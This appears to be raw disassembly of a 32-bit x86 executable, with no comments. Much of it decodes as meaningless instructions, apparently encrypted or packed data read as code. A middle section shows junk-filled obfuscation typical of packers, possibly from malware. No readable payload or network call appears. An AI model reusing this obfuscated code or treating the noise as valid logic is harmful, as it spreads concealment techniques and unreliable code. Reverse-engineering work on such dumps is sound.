  403df0:	xor    DWORD PTR [ebp-0x1c],edi
  403df3:	xor    edx,edx
  403df5:	or     edx,DWORD PTR [ebp-0x1c]
  403df8:	sub    DWORD PTR ds:0x42842d,0x5e3f
  403e02:	shl    ecx,0x1e
  403e05:	sbb    DWORD PTR ds:0x42842d,0x5068
  403e0f:	add    edx,DWORD PTR [ebp-0x2c]
  403e12:	jmp    0x4041b3
  403e17:	bound  ecx,QWORD PTR [ebx-0x73d3f5ff]
  403e1d:	push   0xffffffab
  403e1f:	(bad)  
  403e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e21:	push   ss
  403e22:	rol    DWORD PTR [edx+0x1c],1
  403e25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e26:	jecxz  0x403de6
  403e28:	cmc    
  403e29:	mov    esi,0xbec4bdbe
  403e2e:	mov    esi,0x9266fd06
  403e33:	(bad)  
  403e34:	fsub   QWORD PTR [ebp+0x32]
  403e37:	loop   0x403e6b
  403e39:	jno    0x403df9
  403e3b:	aad    0x31
  403e3d:	jmp    0xb671:0xcc4457c
  403e44:	loopne 0x403e16
  403e46:	fdiv   DWORD PTR [esi+esi*4-0x257176c8]
  403e4d:	xchg   ebx,eax
  403e4e:	cmc    
  403e4f:	aas    
  403e50:	mov    ds:0xf298dee4,eax
  403e55:	cmp    DWORD PTR [ecx+eiz*4],esi
  403e58:	xor    eax,0xb8b48627
  403e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e5e:	xor    ebx,esp
  403e60:	jle    0x403edc
  403e62:	daa    
  403e63:	dec    esi
  403e64:	mov    ebp,DWORD PTR [ecx]
  403e66:	aaa    
  403e67:	mov    ah,dl
  403e69:	and    al,0x57
  403e6b:	sbb    DWORD PTR [edi+ecx*8+0x7d5e993a],ecx
  403e72:	aas    
  403e73:	test   BYTE PTR [ebp-0x32f16222],ah
  403e79:	jle    0x403e19
  403e7b:	and    eax,0x54c005b6
  403e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e81:	or     BYTE PTR [ebx+eax*8],al
  403e84:	pop    edx
  403e85:	xchg   ebx,eax
  403e86:	mov    ch,0xe2
  403e88:	dec    ecx
  403e89:	push   es
  403e8a:	(bad)  
  403e8b:	scas   al,BYTE PTR es:[edi]
  403e8c:	adc    al,0x63
  403e8e:	fcmovb st,st(2)
  403e90:	or     BYTE PTR [ecx],al
  403e92:	sub    eax,ecx
  403e94:	mov    ah,0xbb
  403e96:	ret    0x39c2
  403e99:	xlat   BYTE PTR ds:[ebx]
  403e9a:	test   eax,0xc0b53c1e
  403e9f:	pop    esp
  403ea0:	add    edi,DWORD PTR [edx-0x1750da25]
  403ea6:	mov    WORD PTR [edx],ss
  403ea8:	call   0x2754:0x2fd5ff6e
  403eaf:	loope  0x403e68
  403eb1:	xchg   ecx,eax
  403eb2:	fistp  DWORD PTR [esp+ebp*4+0x4bf93d02]
  403eb9:	ficomp WORD PTR [esi+0x2d00925d]
  403ebf:	push   esi
  403ec0:	lods   eax,DWORD PTR ds:[esi]
  403ec1:	icebp  
  403ec2:	xchg   BYTE PTR [edx],ah
  403ec4:	and    esp,DWORD PTR [edx+0x46efc229]
  403eca:	das    
  403ecb:	(bad)  
  403ecc:	add    al,0xb3
  403ece:	call   0xb753:0x5abbdfaf
  403ed5:	mov    DWORD PTR [ebx+0x3fccc656],ebp
  403edb:	repz push edi
  403edd:	in     eax,0x8c
  403edf:	or     al,0xec
  403ee1:	test   BYTE PTR [edx+ebx*4],dh
  403ee4:	jl     0x403e6b
  403ee6:	fiadd  WORD PTR [edx+0x1]
  403ee9:	js     0x403eac
  403eeb:	push   ebp
  403eec:	int    0xa6
  403eee:	mov    ah,0x94
  403ef0:	jae    0x403f02
  403ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ef3:	push   eax
  403ef4:	xlat   BYTE PTR ds:[ebx]
  403ef5:	or     eax,DWORD PTR [ebx]
  403ef7:	or     BYTE PTR [edi+0x4c],dh
  403efa:	int    0x5f
  403efc:	cli    
  403efd:	adc    al,0xad
  403eff:	es jl  0x403ecd
  403f02:	pop    ds
  403f03:	loop   0x403f3c
  403f05:	(bad)
  403f08:	cmp    eax,0x4b680952
  403f0d:	xchg   edi,eax
  403f0e:	mov    bl,0x93
  403f10:	adc    eax,0x7ec3608b
  403f15:	fscale 
  403f17:	aad    0x8a
  403f19:	sti    
  403f1a:	inc    ecx
  403f1b:	(bad)  
  403f1d:	inc    edi
  403f1e:	or     BYTE PTR [eax-0x11],dl
  403f21:	mov    bh,0x50
  403f23:	inc    ebp
  403f24:	test   al,0xd9
  403f26:	test   al,0x23
  403f28:	mov    ah,0x68
  403f2a:	jo     0x403eda
  403f2c:	mov    ebp,0x7202e32e
  403f31:	std    
  403f32:	retf   0x7b0e
  403f35:	rcr    edi,1
  403f37:	call   0xb670:0x7becd045
  403f3e:	jmp    0x403ef4
  403f40:	je     0x403fb5
  403f42:	mov    bl,0xdb
  403f44:	and    eax,0xccd212aa
  403f49:	in     al,dx
  403f4a:	(bad)  
  403f4c:	xchg   BYTE PTR [ebx-0x19],bh
  403f4f:	xchg   BYTE PTR [edi+edi*4-0x7f],bl
  403f53:	mov    al,0x28
  403f55:	mov    bh,0xcf
  403f57:	mov    cl,0xf8
  403f59:	jnp    0x403f16
  403f5b:	out    dx,eax
  403f5c:	in     eax,dx
  403f5d:	cmp    eax,0x7f474bcf
  403f62:	int3   
  403f63:	rcl    DWORD PTR [ecx-0x3908579],0xc1
  403f6a:	jmp    0x65f6be95
  403f6f:	shl    DWORD PTR [edx],1
  403f71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f72:	bound  ecx,QWORD PTR [ebp-0x32502681]
  403f78:	jbe    0x403f7f
  403f7a:	dec    eax
  403f7b:	(bad)  
  403f7c:	fcom   DWORD PTR [esi-0x57a4b22c]
  403f82:	lds    esp,FWORD PTR [esp+ebx*4-0x3c]
  403f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f87:	frstor [ebx-0x1e]
  403f8a:	aam    0x36
  403f8c:	cli    
  403f8d:	jbe    0x403f55
  403f8f:	sub    BYTE PTR [edx-0x38],ch
  403f92:	and    al,0x1b
  403f94:	adc    BYTE PTR [esi-0x4642a1e8],ah
  403f9a:	xchg   esi,eax
  403f9b:	or     BYTE PTR [ebp+eax*4+0x64e90f4a],0x4d
  403fa3:	fwait
  403fa4:	mov    ah,0x40
  403fa6:	cwde   
  403fa7:	xor    eax,0x4ba36e8b
  403fac:	(bad)  
  403fad:	rcl    BYTE PTR [ebx],1
  403faf:	xor    eax,0x3193e4b3
  403fb4:	sbb    cl,BYTE PTR [esi-0x53]
  403fb7:	push   edi
  403fb8:	jmp    0x1ca:0xe875f1be
  403fbf:	mov    bh,0xa0
  403fc1:	sbb    ebp,DWORD PTR [edx+ebx*1]
  403fc4:	xchg   BYTE PTR [eax+0x7a821799],cl
  403fca:	in     al,0xc5
  403fcc:	jno    0x40401b
  403fce:	and    al,0x90
  403fd0:	add    eax,0xf239cbeb
  403fd5:	pop    edi
  403fd6:	mov    esi,0xc82fc01e
  403fdb:	and    eax,0x654d899a
  403fe0:	ds or  edx,esp
  403fe3:	or     eax,DWORD PTR [ebp+0x562a271c]
  403fe9:	std    
  403fea:	std    
  403feb:	je     0x404017
  403fed:	test   BYTE PTR [eax],dl
  403fef:	adc    BYTE PTR [ebx],bh
  403ff1:	mov    ch,bl
  403ff3:	rcr    DWORD PTR [ebx],0x1a
  403ff6:	mov    ch,0xa8
  403ff8:	jo     0x403fe7
  403ffa:	outs   dx,BYTE PTR ds:[esi]
  403ffb:	mov    ds:0x9d24eb7,al
  404000:	xchg   esp,eax
  404001:	sbb    al,0x35
  404003:	push   eax
  404004:	mov    gs,WORD PTR [esi-0x2a]
  404007:	ins    BYTE PTR es:[edi],dx
  404008:	adc    al,BYTE PTR [edx+0x3a]
  40400b:	fadd   QWORD PTR [ecx+0x4bd26d7b]
  404011:	add    bh,dh
  404013:	pop    ecx
  404014:	mov    ds:0x6431ff51,eax
  404019:	imul   DWORD PTR [eax+0x13941b4e]
  40401f:	iret   
  404020:	stc    
  404021:	jmp    0x40407c
  404023:	xchg   esp,eax
  404024:	sbb    BYTE PTR [ebx-0x2ceb9bd5],bl
  40402a:	sub    esi,edi
  40402c:	jg     0x404030
  40402e:	addr16 dec ebp
  404030:	push   0x773f72a3
  404035:	mov    ch,0x8f
  404037:	xchg   BYTE PTR [edi-0x58],cl
  40403a:	test   eax,0xacdc8977
  40403f:	add    al,0x37
  404041:	dec    edi
  404042:	fisttp DWORD PTR [ecx+0x3450ff2d]
  404048:	cmp    eax,0x316f6186
  40404d:	and    ch,BYTE PTR [esi+ebx*4+0xb]
  404051:	or     eax,DWORD PTR [ebx]
  404053:	pop    ecx
  404054:	retf   0xe5f2
  404057:	clc    
  404058:	mov    ds:0x8ba96b36,al
  40405d:	mov    edi,0xaf3588c
  404062:	enter  0x7169,0x5d
  404066:	addr16 cdq 
  404068:	leave  
  404069:	(bad)  
  40406a:	mov    dl,0x79
  40406d:	cwde   
  40406e:	push   ds
  40406f:	push   0xe3b6a9bc
  404074:	fimul  WORD PTR [ebx+0x49a0b109]
  40407a:	(bad)  
  40407b:	mov    dl,BYTE PTR [ebp+0xe763a25]
  404081:	outs   dx,BYTE PTR fs:[esi]
  404083:	sar    DWORD PTR ds:0x95809d6e,1
  404089:	cdq    
  40408a:	retf   0x569a
  40408d:	and    eax,0x12c678b1
  404092:	fbstp  TBYTE PTR [eax-0x71]
  404095:	adc    ebp,ecx
  404097:	retf   0x3ce2
  40409a:	out    dx,eax
  40409b:	mov    DWORD PTR [edx+0x4608561f],eax
  4040a1:	fist   WORD PTR [eax+0x3c]
  4040a4:	cmc    
  4040a5:	pop    ebx
  4040a6:	repnz test al,0x89
  4040a9:	xchg   esi,eax
  4040aa:	cmp    BYTE PTR [ecx],ah
  4040ac:	sti    
  4040ad:	adc    eax,0x86b15c68
  4040b2:	sub    eax,0x1041ce3
  4040b7:	fcmovb st,st(5)
  4040b9:	shr    DWORD PTR [eax],cl
  4040bb:	mov    edx,0x5c94067d
  4040c0:	(bad)  
  4040c2:	add    DWORD PTR [edx-0x48aad349],eax
  4040c8:	nop
  4040c9:	pusha  
  4040ca:	xchg   edi,eax
  4040cb:	jne    0x404062
  4040cd:	add    BYTE PTR [eax-0x3ec8948b],al
  4040d3:	mov    ebx,0xa58dce45
  4040d8:	cmp    eax,0xb6a07833
  4040dd:	xchg   DWORD PTR [edi],edi
  4040df:	mov    al,dh
  4040e1:	cmp    dh,0x48
  4040e4:	stc    
  4040e5:	sbb    al,0xd8
  4040e7:	sbb    eax,0xe32c07de
  4040ec:	test   BYTE PTR [ebp+0x35],0xf5
  4040f0:	or     BYTE PTR [eax+0x3976f84d],al
  4040f6:	pop    ss
  4040f7:	sub    ah,BYTE PTR [esi+ecx*8+0x1ca953a3]
  4040fe:	sbb    al,0x18
  404100:	pop    esi
  404101:	dec    ebx
  404102:	pop    ds
  404103:	stc    
  404104:	ret    
  404105:	push   ebp
  404106:	in     eax,dx
  404107:	and    bh,BYTE PTR [esi+0x58a6ff4d]
  40410d:	aad    0x36
  40410f:	out    dx,al
  404110:	dec    eax
  404111:	aam    0xdb
  404113:	repz mov dh,0x7d
  404116:	jmp    0x4040f0
  404118:	scas   al,BYTE PTR es:[edi]
  404119:	xchg   ebx,eax
  40411a:	push   eax
  40411b:	adc    BYTE PTR [ecx],bl
  40411d:	push   ds
  40411e:	ror    BYTE PTR [bx],0x10
  404122:	xor    edi,DWORD PTR [ebx+0x50]
  404125:	leave  
  404126:	inc    esp
  404127:	scas   eax,DWORD PTR es:[edi]
  404128:	add    BYTE PTR [esp+ecx*8+0x675b40b4],dh
  40412f:	pushf  
  404130:	cmp    bh,BYTE PTR [ebx]
  404132:	fdiv   DWORD PTR ds:0x1b3c7b42
  404138:	addr16 aas 
  40413a:	cmp    al,0x79
  40413d:	pop    ebp
  40413e:	popf   
  40413f:	add    BYTE PTR [edx+0x1d6ce3eb],al
  404145:	jp     0x4041aa
  404147:	jo     0x4041af
  404149:	jle    0x4040ff
  40414b:	test   DWORD PTR [ebp-0x80],edi
  40414e:	das    
  40414f:	add    al,BYTE PTR [ebp-0xd]
  404152:	add    edx,DWORD PTR [edx+0x1e]
  404155:	and    DWORD PTR [edi],eax
  404157:	mov    eax,ds:0x9739088b
  40415c:	shl    DWORD PTR [eax],0x32
  40415f:	mov    cl,0xd
  404161:	scas   eax,DWORD PTR es:[edi]
  404162:	and    esp,DWORD PTR [edi-0x9]
  404165:	sbb    DWORD PTR [ebx-0x5295524c],esi
  40416b:	mov    cl,0x6a
  40416d:	dec    eax
  40416e:	xchg   esi,ecx
  404170:	(bad)  
  404171:	call   0xe54f:0x2bb7563e
  404178:	jo     0x404109
  40417a:	adc    edx,DWORD PTR [esi+eiz*1-0x1c942a57]
  404181:	and    ch,0xae
  404184:	cwde   
  404185:	push   esi
  404186:	sahf   
  404187:	out    dx,eax
  404188:	jns    0x404120
  40418a:	inc    eax
  40418b:	mov    esp,0xf456ac90
  404190:	ins    DWORD PTR es:[edi],dx
  404191:	add    DWORD PTR [esi],0xffffffa8
  404194:	aaa    
  404195:	into   
  404196:	pushf  
  404197:	mov    dl,0x69
  404199:	adc    al,0xfc
  40419b:	shl    BYTE PTR [ecx+0x6f],0xb1
  40419f:	and    esi,DWORD PTR [edi+0x2]
  4041a2:	dec    ebx
  4041a3:	in     al,0xfa
  4041a5:	pop    eax
  4041a6:	stc    
  4041a7:	xlat   BYTE PTR ds:[ebx]
  4041a8:	adc    DWORD PTR [edi+0x44],ebx
  4041ab:	mov    ebp,0x8a4d87e7
  4041b0:	hlt    
  4041b1:	mov    ah,0xcb
  4041b3:	add    DWORD PTR [eax],edx
  4041b5:	cmp    DWORD PTR ds:0x428495,0x0
  4041bc:	not    ecx
  4041be:	mov    DWORD PTR ds:0x428351,0x38eb
  4041c8:	jmp    0x40423c
  4041cd:	mov    edx,DWORD PTR ds:0x4284ed
  4041d3:	cmp    DWORD PTR ds:0x428495,0x0
  4041da:	jne    0x40421e
  4041e0:	push   DWORD PTR [ebp-0x1c]
  4041e3:	push   0x3daa
  4041e8:	push   0x6a0e
  4041ed:	call   DWORD PTR ds:0x42dff8
  4041f3:	mov    edx,DWORD PTR ds:0x428445
  4041f9:	xor    edx,DWORD PTR ds:0x428581
  4041ff:	mov    DWORD PTR ds:0x428445,edx
  404205:	or     edx,DWORD PTR ds:0x428521
  40420b:	movzx  edx,WORD PTR ds:0x42845d
  404212:	and    DWORD PTR ds:0x428481,edx
  404218:	xor    ecx,0x6193
  40421e:	add    edx,0x3a4f
  404224:	add    DWORD PTR ds:0x428431,ecx
  40422a:	mov    ecx,DWORD PTR ds:0x4283fd
  404230:	mov    edx,DWORD PTR ds:0x428541
  404236:	sub    ecx,edx
  404238:	imul   ecx,DWORD PTR [ecx+edx*1]
  40423c:	mov    eax,DWORD PTR [esi]
  40423e:	cmp    DWORD PTR ds:0x428491,0x0
  404245:	mov    DWORD PTR ds:0x428385,0x80f
  40424f:	mov    DWORD PTR ds:0x428589,ecx
  404255:	jmp    0x4042b8
  40425a:	mov    DWORD PTR ds:0x42843d,0x4518
  404264:	cmp    DWORD PTR ds:0x428491,0x0
  40426b:	jb     0x404293
  404271:	push   DWORD PTR [ebp-0x10]
  404274:	call   DWORD PTR ds:0x42dffc
  40427a:	adc    edx,0x1a1
  404280:	xor    ecx,ecx
  404282:	add    ecx,DWORD PTR ds:0x4284d1
  404288:	mov    edx,DWORD PTR ds:0x4285c1
  40428e:	sub    ecx,edx
  404290:	xor    ecx,DWORD PTR [ecx+edx*1]
  404293:	add    DWORD PTR ds:0x42845d,0x3b89
  40429d:	sbb    DWORD PTR ds:0x4285a1,ecx
  4042a3:	sub    edx,edx
  4042a5:	movzx  ecx,WORD PTR ds:0x428509
  4042ac:	xor    ecx,DWORD PTR ds:0x428579
  4042b2:	mov    DWORD PTR ds:0x428509,ecx
  4042b8:	mov    ecx,DWORD PTR [esi+0x4]
  4042bb:	shrd   eax,ecx,0x2
  4042bf:	shr    ecx,0x2
  4042c2:	cmp    DWORD PTR ds:0x428599,0x0
  4042c9:	mov    DWORD PTR ds:0x428509,ecx
  4042cf:	mov    DWORD PTR ds:0x428499,0x365d
  4042d9:	jmp    0x404321
  4042de:	mov    DWORD PTR ds:0x428455,0x759d
  4042e8:	cmp    DWORD PTR ds:0x428599,0x0
  4042ef:	jae    0x404315
  4042f5:	call   DWORD PTR ds:0x42e248
  4042fb:	adc    edx,ecx
  4042fd:	mov    ecx,DWORD PTR ds:0x428449
  404303:	and    ecx,DWORD PTR ds:0x428585
  404309:	mov    DWORD PTR ds:0x428449,ecx
  40430f:	sbb    edx,DWORD PTR ds:0x428381
  404315:	sbb    DWORD PTR ds:0x428459,0x7721
  40431f:	add    ecx,ecx
  404321:	mov    ecx,DWORD PTR [esi]
  404323:	mov    edx,DWORD PTR [esi+0x4]
  404326:	xor    eax,edi
  404328:	shl    ecx,0x1e
  40432b:	xor    edx,edx
  40432d:	or     edx,eax
  40432f:	mov    DWORD PTR [ebp-0x4],edx
  404332:	mov    DWORD PTR [ebp-0x30],0xcb79b576
  404339:	mov    eax,0x9c2b8ae8
  40433e:	mov    DWORD PTR [ebp-0x2c],eax
  404341:	mov    DWORD PTR [ebp-0x20],0xcb79b572
  404348:	mov    DWORD PTR [ebp-0x1c],eax
  40434b:	mov    DWORD PTR [ebp-0x10],0xcb79b57e
  404352:	mov    DWORD PTR [ebp-0xc],eax
  404355:	mov    DWORD PTR [ebp-0x60],0xcb79b57a
  40435c:	mov    DWORD PTR [ebp-0x5c],eax
  40435f:	jmp    0x404700
  404364:	cmp    BYTE PTR [eax+0x14],dh
  404367:	cmp    al,0x9c
  404369:	mov    esp,0xa24d7438
  40436e:	mov    BYTE PTR [edi+ebx*2-0x426df304],ah
  404375:	sti    
  404376:	mov    esi,0xbec4bdbe
  40437b:	mov    esi,0xdcee8290
  404380:	ins    BYTE PTR es:[edi],dx
  404381:	lock mov ds:0x5aa096f5,al
  404387:	out    0x46,al
  404389:	cld    
  40438a:	pop    esi
  40438b:	xchg   edi,eax
  40438c:	rcl    BYTE PTR [ecx-0x339626],1
  404392:	adc    edx,DWORD PTR [ecx+0x252d6b8a]
  404398:	add    dl,ah
  40439a:	sbb    eax,0x7319bf5d
  40439f:	mov    ecx,0x11cca0a5
  4043a4:	sbb    al,0x6b
  4043a6:	loop   0x404414
  4043a8:	dec    edx
  4043a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043aa:	aad    0xa3
  4043ac:	mov    ds:0x913b3058,al
  4043b1:	inc    esi
  4043b2:	lahf   
  4043b3:	scas   eax,DWORD PTR es:[edi]
  4043b4:	push   DWORD PTR [edi-0x24]
  4043b7:	retf   
  4043b8:	mov    BYTE PTR [ebp-0x633b29cd],0x3d
  4043bf:	retf   0xc964
  4043c2:	sbb    esp,ecx
  4043c4:	sti    
  4043c5:	xchg   edi,eax
  4043c6:	int    0xd7
  4043c8:	out    dx,eax
  4043c9:	jge    0x404359
  4043cb:	shl    DWORD PTR [edi-0xe],cl
  4043ce:	sbb    cl,dl
  4043d0:	jno    0x4043f9
  4043d2:	pop    edi
  4043d3:	xlat   BYTE PTR ds:[ebx]
  4043d4:	mov    edi,0x651d8109
  4043d9:	ds jns 0x40441e
  4043dc:	js     0x4043b6
  4043de:	imul   edx,DWORD PTR [ecx],0x24
  4043e1:	inc    edi
  4043e2:	pop    es
  4043e3:	mov    ch,cl
  4043e5:	ds mov ebx,0xdbc2b0bf
  4043eb:	sbb    DWORD PTR [esi+0x4209779c],0x75
  4043f2:	adc    eax,0x90f2e671
  4043f7:	pop    esp
  4043f8:	adc    bh,BYTE PTR [edx+0x46]
  4043fb:	mov    al,ds:0xfd37d83
  404400:	jl     0x404415
  404402:	call   0x5fe61452
  404407:	mov    esi,DWORD PTR [ebp+0x22]
  40440a:	jns    0x404429
  40440c:	adc    eax,0x5393542e
  404411:	not    BYTE PTR [ebx+0x7b]
  404414:	ror    BYTE PTR [ebx+0x6d],cl
  404417:	or     DWORD PTR [eax-0xd],esi
  40441a:	ret    
  40441b:	popa   
  40441c:	jp     0x40444f
  40441e:	push   ss
  40441f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404420:	sar    DWORD PTR [ebx],0x99
  404423:	push   eax
  404424:	push   0x2b
  404426:	pop    esp
  404427:	mov    esp,0x5e51b884
  40442c:	push   0xc2562403
  404431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404432:	(bad)  
  404434:	pop    esp
  404435:	es repz retf 0xad32
  40443a:	sub    BYTE PTR [ebx],0xab
  40443d:	dec    edx
  40443e:	sub    al,dl
  404440:	ins    DWORD PTR es:[edi],dx
  404441:	aad    0xb9
  404443:	pop    eax
  404444:	adc    DWORD PTR [ebx],edx
  404446:	ret    
  404447:	fild   WORD PTR [ebp+0x48]
  40444a:	jnp    0x4043d9
  40444c:	sub    ch,BYTE PTR es:[eax]
  40444f:	repz rcr cl,1
  404452:	ins    DWORD PTR es:[edi],dx
  404453:	mov    al,0x95
  404455:	rol    BYTE PTR [ebp-0x45934c2f],1
  40445b:	test   BYTE PTR [eax],dh
  40445d:	or     BYTE PTR [ebx-0x52],dl
  404460:	jmp    0x40440a
  404462:	icebp  
  404463:	fs or  eax,0xcf385124
  404469:	rcl    ah,1
  40446b:	jle    0x404433
  40446d:	retf   0x6ed4
  404470:	push   ebp
  404471:	inc    esp
  404472:	jge    0x404453
  404474:	rcr    edi,1
  404476:	pop    ss
  404477:	fs inc esi
  404479:	push   0xffffffac
  40447b:	push   esp
  40447c:	mov    ah,0x77
  40447e:	adc    dh,BYTE PTR [ebx]
  404480:	or     DWORD PTR [ebx-0x39c157a9],edi
  404486:	inc    eax
  404487:	mul    BYTE PTR [edx+0x496c8632]
  40448d:	imul   edx,DWORD PTR [ebp+0x5b],0x2cce95fe
  404494:	imul   ebx,DWORD PTR [eax-0x4f48ae17],0xdc726af8
  40449e:	pop    ds
  40449f:	add    ecx,esp
  4044a1:	rcr    BYTE PTR [eax],cl
  4044a3:	rcr    DWORD PTR [ebp+0x524857fc],1
  4044a9:	push   esp
  4044aa:	add    al,BYTE PTR es:[ebp+0x67]
  4044ae:	(bad)  
  4044af:	je     0x404474
  4044b1:	imul   esi,DWORD PTR [ecx-0x19],0x3a9f96b1
  4044b8:	stc    
  4044b9:	imul   edi,eax,0x11
  4044bc:	mov    esi,0xeccf1a14
  4044c1:	or     BYTE PTR [edi+0x46f8fb6f],bl
  4044c7:	pop    ebp
  4044c8:	cs stos BYTE PTR es:[edi],al
  4044ca:	retf   
  4044cb:	pop    esp
  4044cc:	add    al,0x54
  4044cf:	test   eax,0xc60d85c9
  4044d4:	mov    esi,0x633be37d
  4044d9:	stos   DWORD PTR es:[edi],eax
  4044da:	jo     0x404531
  4044dc:	je     0x4044ff
  4044de:	outs   dx,BYTE PTR ds:[esi]
  4044df:	pusha  
  4044e0:	(bad)  
  4044e2:	mov    DWORD PTR [edx],esi
  4044e4:	repnz cmp dl,BYTE PTR ds:0xe8a634b2
  4044eb:	xchg   edi,eax
  4044ec:	(bad)  
  4044ed:	and    edi,ecx
  4044ef:	sub    ebp,DWORD PTR [edi+edx*2-0xe9ad398]
  4044f6:	dec    esp
  4044f7:	shr    DWORD PTR ds:0xc6d473e,0x7
  4044fe:	iret   
  4044ff:	jae    0x404493
  404501:	int    0xf9
  404503:	mov    dh,al
  404505:	sbb    DWORD PTR [esi+0x41dd98d4],eax
  40450b:	push   0x56d427d
  404510:	jno    0x40458d
  404512:	pop    ebp
  404513:	xor    eax,0xa5b869b2
  404518:	out    dx,al
  404519:	loope  0x404594
  40451b:	je     0x404545
  40451d:	pop    ebx
  40451e:	add    ah,BYTE PTR [esi-0x4f3129ef]
  404524:	sbb    DWORD PTR [esi+0x5f],0xc
  404528:	dec    esi
  404529:	xchg   edi,eax
  40452a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40452b:	lds    esi,FWORD PTR [ebx-0x37]
  40452e:	sbb    BYTE PTR cs:[edx+0x1fc7e929],bl
  404535:	adc    ch,dh
  404537:	jne    0x404576
  404539:	loop   0x4044e8
  40453b:	dec    ecx
  40453c:	dec    cl
  40453e:	or     bl,BYTE PTR [edi]
  404540:	in     al,0x15
  404542:	mov    esi,eax
  404544:	shl    BYTE PTR [ecx+0x2dce8984],1
  40454a:	add    edx,DWORD PTR [edx+0x76]
  40454d:	jnp    0x404570
  40454f:	imul   esi,DWORD PTR [edi],0x1a70f4d
  404555:	xor    al,0x29
  404557:	mov    bl,0x30
  404559:	pop    edi
  40455a:	jbe    0x40453c
  40455c:	or     edx,ebx
  40455e:	push   esi
  40455f:	pusha  
  404560:	xchg   ebp,eax
  404561:	inc    eax
  404562:	(bad)
  404565:	push   eax
  404566:	cmp    al,0xdb
  404568:	xchg   ebp,eax
  404569:	push   eax
  40456b:	mov    edi,0x3f8008e
  404570:	pop    esp
  404571:	mov    bh,0x62
  404573:	xchg   ebp,eax
  404574:	mov    bl,0xdf
  404576:	retf   
  404577:	ja     0x4045f2
  404579:	pop    eax
  40457a:	mov    WORD PTR [edx],fs
  40457c:	cmp    BYTE PTR [ebx-0x55],cl
  40457f:	inc    edi
  404580:	push   cs
  404581:	sbb    eax,0x928b7970
  404586:	es push ecx
  404588:	outs   dx,BYTE PTR ds:[esi]
  404589:	sar    DWORD PTR [esp+ecx*4],cl
  40458c:	and    esp,DWORD PTR [ebx+0x7b27b5ef]
  404592:	iret   
  404593:	push   eax
  404594:	lds    ebx,FWORD PTR [ebx-0x5a]
  404597:	pop    es
  404598:	ja     0x404566
  40459a:	in     eax,dx
  40459b:	lock sbb edx,ecx
  40459e:	mov    edi,0xc72ac9a7
  4045a3:	je     0x4045c7
  4045a5:	mov    dl,0x5d
  4045a7:	mov    edx,0x4bb0e9d5
  4045ac:	ss ins BYTE PTR es:[edi],dx
  4045ae:	sub    ebx,edi
  4045b0:	add    ebp,DWORD PTR [eax-0x51]
  4045b3:	arpl   WORD PTR [edi+0x2f],si
  4045b6:	(bad)  
  4045b8:	daa    
  4045b9:	loopne 0x4045c6
  4045bb:	and    al,0xc3
  4045bd:	retf   
  4045be:	in     eax,0xcc
  4045c0:	leave  
  4045c1:	cmp    BYTE PTR [esi+0x1b],bl
  4045c4:	fistp  QWORD PTR [ecx-0x3e]
  4045c7:	retf   0x53ce
  4045ca:	fstp   QWORD PTR [ecx+edi*2]
  4045cd:	pop    ds
  4045ce:	gs jb  0x4045af
  4045d1:	add    edi,edx
  4045d3:	sub    eax,DWORD PTR ds:0x4af48c48
  4045d9:	aas    
  4045da:	fist   DWORD PTR [ebx+eiz*8-0x63619dcf]
  4045e1:	enter  0x4e56,0x12
  4045e5:	or     BYTE PTR [eax],bh
  4045e7:	lea    esi,[edx+esi*2]
  4045ea:	sar    dh,cl
  4045ec:	sti    
  4045ed:	cdq    
  4045ee:	jno    0x404580
  4045f0:	mov    edx,0x364484c0
  4045f5:	sbb    ebx,ebx
  4045f7:	cmp    eax,0x5719877c
  4045fc:	adc    edx,DWORD PTR [eax-0x151b89a2]
  404602:	mov    ebx,0x32f2e327
  404607:	cmc    
  404608:	jns    0x4045fe
  40460a:	pop    ebp
  40460b:	lea    ecx,ds:0xd68299e0
  404611:	jo     0x404640
  404613:	pop    es
  404614:	sbb    al,0x11
  404616:	(bad)  
  404617:	lods   al,BYTE PTR ds:[esi]
  404618:	xor    DWORD PTR [esi+0x71b7ef35],ecx
  40461e:	pop    es
  40461f:	(bad)  
  404620:	jl     0x4045f4
  404622:	cmp    BYTE PTR [ebx+edx*1],cl
  404625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404626:	out    dx,al
  404627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404628:	adc    eax,0x75d57df9
  40462d:	push   esp
  40462e:	addr16 mov esp,0x13201036
  404634:	imul   esp,ecx,0xffffffe3
  404637:	sub    eax,0x34a5e6d8
  40463c:	mov    eax,ds:0x15159581
  404641:	add    cl,BYTE PTR cs:[edi-0x3667b9d0]
  404648:	ds cmp eax,0x7bcdfd90
  40464e:	and    eax,0xea6719c8
  404653:	mov    ebp,0x1b22a26
  404658:	(bad)  
  404659:	aam    0x72
  40465b:	mov    dh,0xe8
  40465d:	xor    bh,BYTE PTR [ebp+0x2f]
  404660:	or     cl,BYTE PTR ds:[eax]
  404663:	pop    es
  404664:	dec    edx
  404665:	jnp    0x40468f
  404667:	pop    esp
  404668:	xchg   ebp,eax
  404669:	mov    bl,0xca
  40466b:	mov    al,ds:0xe5225ba2
  404671:	sub    cl,BYTE PTR [esi+0x32]
  404674:	mov    cl,0x16
  404676:	addr16 inc esi
  404678:	dec    esi
  404679:	data16 jl 0x404619
  40467c:	test   DWORD PTR [ecx],ebx
  40467e:	pop    ebx
  40467f:	daa    
  404680:	inc    esp
  404681:	xchg   DWORD PTR [ecx+ecx*4-0x67],ecx
  404685:	mov    dh,BYTE PTR [ebp+0x115dafd4]
  40468b:	mov    dl,0x2d
  40468d:	cld    
  40468e:	aas    
  40468f:	xchg   DWORD PTR [edi+eax*8+0x1b],ebp
  404693:	lahf   
  404694:	dec    ebx
  404695:	mov    esi,0xde7e7d74
  40469a:	gs jmp 0x404717
  40469d:	pop    esi
  40469e:	jmp    0xc119:0x85336113
  4046a5:	mov    cl,0x7b
  4046a7:	and    ecx,DWORD PTR [edi-0x73]
  4046aa:	adc    edi,DWORD PTR [eax+0x49eab297]
